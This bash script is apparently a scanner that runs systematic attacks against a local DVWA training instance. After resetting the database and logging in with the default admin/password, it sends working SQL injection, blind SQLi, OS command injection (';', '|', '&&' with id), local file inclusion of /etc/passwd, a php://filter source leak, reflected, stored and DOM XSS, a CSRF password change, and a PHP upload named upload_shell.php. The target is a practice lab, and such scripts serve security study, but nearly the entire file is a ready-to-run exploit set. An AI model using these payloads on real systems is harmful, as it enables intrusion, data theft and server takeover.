#!/bin/bash
# Full probe script - systematic test of all DVWA vulnerability classes
# Uses curl with cookie persistence

COOKIE_JAR="/tmp/dvwa_probe_jar.txt"
BASE="http://127.0.0.1:8080"

# Clean start
rm -f "$COOKIE_JAR"

echo "=========================================="
echo "  DVWA Full System Probe"
echo "=========================================="

# Step 1: Reset database to ensure admin/password works
echo ""
echo "[1] Resetting database..."
SETUP_PAGE=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/setup.php")
SETUP_TOKEN=$(echo "$SETUP_PAGE" | grep -oP "value='\K[^']+(?=')" | tail -1)
echo "  Setup token: $SETUP_TOKEN"
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -d "create_db=Create+/+Reset+Database&user_token=$SETUP_TOKEN" "$BASE/setup.php" > /dev/null
echo "  Database reset done."

# Step 2: Login
echo ""
echo "[2] Logging in as admin/password..."
LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/login.php")
LOGIN_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "value='\K[^']+(?=')" | tail -1)
echo "  Login token: $LOGIN_TOKEN"
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -L -d "username=admin&password=password&user_token=$LOGIN_TOKEN&Login=Login" "$BASE/login.php")
if echo "$RESULT" | grep -q "logged in"; then
    echo "  [!] Login SUCCESSFUL"
else
    echo "  [!] Login may have failed - checking..."
    echo "$RESULT" | grep -i "message"
fi

# Step 3: Set security to low
echo ""
echo "[3] Setting security level to low..."
SEC_PAGE=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/security.php")
SEC_TOKEN=$(echo "$SEC_PAGE" | grep -oP "value='\K[^']+(?=')" | tail -1)
echo "  Security token: $SEC_TOKEN"
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -d "security=low&seclev_submit=Submit&user_token=$SEC_TOKEN" "$BASE/security.php" > /dev/null
echo "  Security level set to low."

# Step 4: Verify auth
echo ""
echo "[4] Verifying authentication..."
AUTH_CHECK=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -L -o /dev/null -w "%{http_code}" "$BASE/index.php")
echo "  Auth check: $AUTH_CHECK"

# If we get redirected to login, try logging in again
if [ "$AUTH_CHECK" != "200" ]; then
    echo "  Not authenticated, trying again..."
    LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/login.php")
    LOGIN_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "value='\K[^']+(?=')" | tail -1)
    RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -L -d "username=admin&password=password&user_token=$LOGIN_TOKEN&Login=Login" "$BASE/login.php")
    if echo "$RESULT" | grep -q "logged in"; then
        echo "  Login SUCCESSFUL on retry"
    fi
fi

echo ""
echo "=========================================="
echo "  PROBING VULNERABILITY CLASSES"
echo "=========================================="

# ===== SQL INJECTION =====
echo ""
echo "----- SQL Injection (sqli) -----"
# Test 1: Basic boolean
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit")
if echo "$RESULT" | grep -qP "(First name|Surname|admin|root)"; then
    echo "  [!] SQLi FOUND: 1' OR '1'='1"
    echo "$RESULT" | grep -oP '<pre>[^<]*</pre>' | head -3
fi

# Test 2: UNION
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user(),database()--+-&Submit=Submit")
if echo "$RESULT" | grep -qP "(First name|Surname|root|localhost|dvwa)"; then
    echo "  [!] SQLi UNION FOUND"
    echo "$RESULT" | grep -oP '<pre>[^<]*</pre>' | head -3
fi

# ===== BLIND SQL INJECTION =====
echo ""
echo "----- Blind SQL Injection (sqli_blind) -----"
TRUE_RES=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/sqli_blind/?id=1%27+AND+1%3D1--+-&Submit=Submit")
FALSE_RES=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/sqli_blind/?id=1%27+AND+1%3D2--+-&Submit=Submit")
TRUE_EXISTS=$(echo "$TRUE_RES" | grep -c "User ID exists")
FALSE_EXISTS=$(echo "$FALSE_RES" | grep -c "User ID exists")
echo "  True (1=1): User ID exists = $TRUE_EXISTS"
echo "  False (1=2): User ID exists = $FALSE_EXISTS"
if [ "$TRUE_EXISTS" -ne "$FALSE_EXISTS" ]; then
    echo "  [!] Blind SQLi CONFIRMED (differential response)"
fi

# ===== COMMAND EXECUTION =====
echo ""
echo "----- Command Execution (exec) -----"
for CMD in "127.0.0.1%3B+id" "127.0.0.1+%7C+id" "127.0.0.1+%26%26+id"; do
    RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -d "ip=$CMD&Submit=Submit" -X POST "$BASE/vulnerabilities/exec/")
    if echo "$RESULT" | grep -qP "uid=|www-data"; then
        echo "  [!] Command exec FOUND with: $CMD"
        echo "$RESULT" | grep -oP '<pre>[^<]*</pre>' | head -3
        break
    fi
done

# ===== FILE INCLUSION =====
echo ""
echo "----- File Inclusion (fi) -----"
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/fi/?page=/etc/passwd")
if echo "$RESULT" | grep -q "root:"; then
    echo "  [!] File Inclusion FOUND: /etc/passwd"
    echo "$RESULT" | grep -oP 'root:[^<]*' | head -2
fi

# PHP filter
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php")
if echo "$RESULT" | grep -q "PD9waHA"; then
    echo "  [!] PHP Filter Inclusion FOUND"
    echo "$RESULT" | grep -oP 'PD9waHA[^<]{0,50}' | head -1
fi

# ===== XSS REFLECTED =====
echo ""
echo "----- Reflected XSS (xss_r) -----"
PAYLOAD="<script>alert(1)</script>"
# URL encode
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/xss_r/?name=$ENCODED")
if echo "$RESULT" | grep -qF "$PAYLOAD"; then
    echo "  [!] Reflected XSS FOUND"
    echo "$RESULT" | grep -oP "Hello[^<]*" | head -2
fi

# ===== XSS STORED =====
echo ""
echo "----- Stored XSS (xss_s) -----"
PAYLOAD2="<script>alert(stored)</script>"
ENCODED2=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD2'))")
# Submit
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -d "txtName=test&mtxMessage=$ENCODED2&btnSign=Sign+Guestbook" -X POST "$BASE/vulnerabilities/xss_s/" > /dev/null
# Read
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/xss_s/")
if echo "$RESULT" | grep -qF "$PAYLOAD2"; then
    echo "  [!] Stored XSS FOUND"
fi

# ===== XSS DOM =====
echo ""
echo "----- DOM XSS (xss_d) -----"
PAYLOAD3="<script>alert(dom)</script>"
ENCODED3=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD3'))")
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/xss_d/?default=$ENCODED3")
if echo "$RESULT" | grep -qF "$PAYLOAD3"; then
    echo "  [!] DOM XSS payload reflected in HTML source"
fi

# ===== CSRF =====
echo ""
echo "----- CSRF (csrf) -----"
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/csrf/?password_new=csrfpass123&password_conf=csrfpass123&Change=Change")
if echo "$RESULT" | grep -qiE "Password Changed|password changed"; then
    echo "  [!] CSRF password change via GET works!"
    echo "$RESULT" | grep -oP '<pre>[^<]*</pre>' | head -2
fi

# ===== WEAK ID =====
echo ""
echo "----- Weak Session ID (weak_id) -----"
IDS=""
for i in 1 2 3 4 5; do
    HEADERS=$(curl -s -D- -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/weak_id/" 2>/dev/null)
    # Check for dvwaSession in Set-Cookie
    DVWA_COOKIE=$(echo "$HEADERS" | grep -i "set-cookie.*dvwaSession" | grep -oP 'dvwaSession=\K[^;]+')
    if [ -n "$DVWA_COOKIE" ]; then
        IDS="$IDS $DVWA_COOKIE"
        echo "  dvwaSession=$DVWA_COOKIE"
    fi
done
if [ -n "$IDS" ]; then
    echo "  [!] Weak session IDs detected: $IDS"
fi

# ===== BRUTE FORCE =====
echo ""
echo "----- Brute Force (brute) -----"
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/brute/?username=admin&password=wrongpass&Login=Login")
if echo "$RESULT" | grep -qi "Login failed"; then
    echo "  [!] Brute force endpoint allows login attempts"
fi
# Check for CSRF token
CSRF_COUNT=$(echo "$RESULT" | grep -c "user_token")
echo "  CSRF tokens in page: $CSRF_COUNT"

# ===== CAPTCHA =====
echo ""
echo "----- CAPTCHA (captcha) -----"
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/captcha/")
if echo "$RESULT" | grep -qi "Missing"; then
    echo "  [!] reCAPTCHA key: Missing (CAPTCHA bypass possible)"
fi
# Check steps
STEP=$(echo "$RESULT" | grep -oP 'name="step"[^>]*value="\K[^"]+')
echo "  Current step: $STEP"

# ===== JAVASCRIPT =====
echo ""
echo "----- JavaScript (javascript) -----"
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/javascript/")
echo "  Page length: $(echo "$RESULT" | wc -c)"

# ===== CSP =====
echo ""
echo "----- CSP (csp) -----"
HEADERS=$(curl -s -D- -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE/vulnerabilities/csp/" 2>/dev/null)
CSP_HEADER=$(echo "$HEADERS" | grep -i "content-security-policy")
if [ -n "$CSP_HEADER" ]; then
    echo "  [!] CSP Header: $CSP_HEADER"
fi

# ===== FILE UPLOAD =====
echo ""
echo "----- File Upload (upload) -----"
# Create test PHP file
echo '<?php echo "UPLOAD_OK"; ?>' > /tmp/upload_shell.php
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/upload_shell.php" -F "Upload=Upload" "$BASE/vulnerabilities/upload/")
if echo "$RESULT" | grep -qiE "succesfully uploaded|uploaded"; then
    echo "  [!] File upload SUCCESSFUL!"
elif echo "$RESULT" | grep -qi "failed"; then
    echo "  [!] Upload failed: extension/content check"
fi

# Try with .jpg extension
echo '<?php echo "UPLOAD_OK"; ?>' > /tmp/upload_shell.jpg
RESULT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/upload_shell.jpg" -F "Upload=Upload" "$BASE/vulnerabilities/upload/")
if echo "$RESULT" | grep -qiE "succesfully uploaded|uploaded"; then
    echo "  [!] File upload (jpg) SUCCESSFUL!"
fi

echo ""
echo "=========================================="
echo "  PROBE COMPLETE"
echo "=========================================="